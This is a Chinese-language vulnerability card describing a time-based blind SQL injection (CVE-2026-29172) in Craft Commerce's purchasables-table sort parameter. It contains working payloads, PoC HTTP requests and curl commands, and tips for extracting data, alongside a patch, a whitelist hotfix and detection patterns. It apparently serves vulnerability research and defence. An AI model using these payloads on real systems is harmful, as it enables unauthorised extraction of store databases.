---
id: web-generic-sqli-craft-commerce-sort-orderby-time-blind
title: Craft Commerce sort 参数 ORDER BY 时间盲注（CVE-2026-29172）
type: scenario
domain: web
path: web/generic/sqli
technique: craft-commerce-sort-orderby-injection
aliases:
- Craft Commerce SQL 注入
- CVE-2026-29172
- purchasables-table 注入
- sort 参数 ORDER BY 注入
- Yii2 orderBy 注入
- 可购买商品列表排序注入
tags:
- php
- craftcms
- craft-commerce
- yii2
- sqli
- order-by
- time-blind
- identifier-injection
cve:
- CVE-2026-29172
affected_versions: Craft Commerce >= 4.0.0, < 4.10.2；>= 5.0.0, < 5.5.3（原文）
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V29
  verified_at: '2026-11-05T03:08:50+08:00'
  notes: 已对照原文与3张图核对：Craft Commerce OrdersController::actionPurchasablesTable 按|拆分 sort、 直接进 Yii2 orderBy；基线图02约0.08s、注入图03 SLEEP(5) 6.126s；影响区间与补丁白名单一致。原文图03用SLEEP(5)而正文payload用SLEEP(2)，卡内已按差异说明。frontmatter无sources/source_url（全库惯例），原文URL xz.aliyun.com/news/92547；PoC未在本机执行。
---

## 一句话结论

Craft Commerce 后台订单管理的“可购买商品列表”接口把 `sort` 参数按 `|` 拆成“列名 + 方向”，左半部分未做白名单就交给 Yii2 Query Builder 的 `orderBy()`；`ORDER BY` 是 SQL 标识符位置，无法参数化，框架也不转义字符串列名，低权限店员账号即可用 `sort=id,(SELECT SLEEP(2))|asc` 构造时间盲注。

## 原理

- 漏洞入口：
  ```http
  GET /index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=title|asc&per_page=5
  ```
  控制器 `OrdersController::actionPurchasablesTable()` 从请求读取 `sort`，按 `|` 分割：
  ```php
  [$field, $direction] = explode('|', $sort);
  if ($field && $direction) {
      $orderQuery->orderBy($field . ' ' . $direction);
  }
  ```
  `$field` 未经过任何白名单或字符集校验，直接拼进 `orderBy()`。
- 为什么能注入：`ORDER BY` 后面是 SQL 结构（列名/表达式），不是值位置，不能用 `?` 参数绑定；Yii2 的 `QueryBuilder::buildOrderBy()` 对字符串形式的列名不做转义，只在数组形式才引用列名。这是框架的“应用层负责校验”设计，和 Laravel、ThinkPHP 的 `orderBy` 同类。
- 攻击者把 `sort` 写成：
  ```text
  id,(SELECT SLEEP(2))|asc
  ```
  分割后 `$field = "id,(SELECT SLEEP(2))"`，`$direction = "asc"`，最终 SQL 为：
  ```sql
  SELECT ... ORDER BY id,(SELECT SLEEP(2)) asc
  ```
  MySQL 会对结果集中每一行执行一次子查询，`SLEEP(2)` 造成可见延迟；表行数越多延迟越大（或至少稳定出现一次延迟）。
- 前置权限：`OrdersController::init()` 检查 `commerce-manageOrders` 权限。攻击者只需一个低权限的店员/后台账号即可访问该接口，不需要管理员或更高权限。
- 该漏洞的本质不是“框架有注入”，而是**标识符位置拼接 + 应用层白名单缺失**；补丁在 5.5.3/4.10.2 中给 `$field` 增加了固定白名单（`title`、`sku`、`price`、`stock`、`id`），不匹配则回退 `title`。

## 触发条件

- 目标为 Craft Commerce `>= 4.0.0, < 4.10.2` 或 `>= 5.0.0, < 5.5.3`。
- 攻击者拥有可访问 Commerce 订单后台的低权限账号（具备 `commerce-manageOrders` 权限）。
- `purchasables-table` 端点可访问，且 `sort` 参数被原样传入 `orderBy()`。
- 数据库为 MySQL（时间盲注依赖 `SLEEP`）；其它数据库可换用等价延时/布尔表达式。
- 目标未额外对 `sort` 做网关层白名单（原生版本没有）。

## 利用步骤

1. 登录 Craft 后台，进入 Commerce → Orders，抓取 `purchasables-table` 的 AJAX 请求，确认 `sort` 参数格式为 `列名|方向`。
2. 发送基线请求 `sort=title|asc`，记录响应时间。
3. 发送 `sort=id,(SELECT SLEEP(2))|asc`（URL 编码为 `id%2C%28SELECT+SLEEP%282%29%29%7Casc`），观察响应延迟。
4. 若延迟明显高于基线，确认时间盲注；用 `SLEEP(5)` 或多个子查询进一步验证。
5. 之后可按常规时间盲注提取数据：用 `IF(SUBSTR(...),SLEEP(2),0)` 或 `(SELECT SLEEP(2) FROM ... WHERE ...)` 构造条件延时。
6. 若目标已升级到修复版本，观察 `sort` 中非白名单列名是否被回退为 `title`，确认补丁生效。

## PoC

基线请求（已登录态）：

```http
GET /index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=title%7Casc&per_page=5 HTTP/1.1
Host: target:8880
Accept: application/json
Cookie: CraftSessionId=...; <identity cookie>=...
```

注入请求：

```http
GET /index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=id%2C%28SELECT+SLEEP%282%29%29%7Casc&per_page=5 HTTP/1.1
Host: target:8880
Accept: application/json
Cookie: CraftSessionId=...; <identity cookie>=...
```

curl 版本：

```bash
# 基线
curl -s -b "CraftSessionId=xxx; <identity>=yyy" \
  -H "Accept: application/json" \
  "http://target:8880/index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=title%7Casc&per_page=5"

# SLEEP 注入
curl -s -b "CraftSessionId=xxx; <identity>=yyy" \
  -H "Accept: application/json" \
  "http://target:8880/index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=id,(SELECT+SLEEP(2))%7Casc&per_page=5"
# 预期响应延迟显著高于基线
```

原文实测：基线约 0.08s，注入请求约 6.12s（`SLEEP(2)` 在匹配行上执行多次）。实际延迟取决于结果集行数与 MySQL 优化器的执行方式，验证时应以“注入 vs 基线”的差异为准，不要只依赖固定秒数。

## 变体与关联

- 变体：其它把 `sort`/`orderBy`/`sortField` 参数按 `字段|方向` 解析并拼进 `ORDER BY` 的列表接口，均可套用同一时间盲注。
- 变体：若只白名单了列名而未限制方向，方向位置仍可能被拼接；补丁片段只对 `$field` 做白名单，审计时应确认 `$direction` 是否也被固定为 `ASC`/`DESC`（原文未验证方向注入）。
- 变体：MySQL 可用 `SLEEP`、`BENCHMARK`、`IF()`；其它数据库用 `pg_sleep`、`WAITFOR DELAY` 等等价延时。
- 关联：[[web-generic-sqli-java-identifier-table-order-by-injection]]（同类“标识符位置无法参数化 + 白名单缺失”的通用原理，本卡是 PHP/Yii2 的具体实例）。
- 关联：[[web-generic-sqli-cartesian-product-time-blind]]、[[web-generic-sqli-error-based-extraction]]（确认注入后的数据提取手法）。
- 边界：需要低权限后台账号（非未授权）；影响版本与补丁以原文/官方公告为准。

## 检测与防御

- 修复：升级 Craft Commerce 到 `>= 4.10.2` 或 `>= 5.5.3`；补丁对排序列名做固定白名单。
- 热修复：在调用 `orderBy()` 前对 `$field` 做白名单：
  ```php
  $allowedFields = ['title', 'sku', 'price', 'stock', 'id'];
  if (!in_array($field, $allowedFields, true)) {
      $field = 'title';
  }
  ```
- 加固：方向参数固定为 `ASC`/`DESC`（不要直接拼接用户输入）；对所有动态表名/列名/排序字段使用白名单映射，而不是引号包裹或转义。
- 加固：后台接口按最小权限授权；对 `commerce-manageOrders` 之外的角色禁用该端点；在网关层限制 `sort` 参数的字符集与长度。
- 检测：审计 PHP 中 `orderBy($... . ' ' . $...)`、`orderBy($sort)`、`explode('|', $sort)` 等模式；对 `sort` 参数出现逗号、括号、`SELECT`、`SLEEP`、`IF(` 等特征告警；监控后台列表接口的异常响应时间与低权限账号的高频排序请求。
- 通用原则：`ORDER BY` 不支持参数化占位符，框架不会替应用校验列名；白名单是唯一可靠方案。
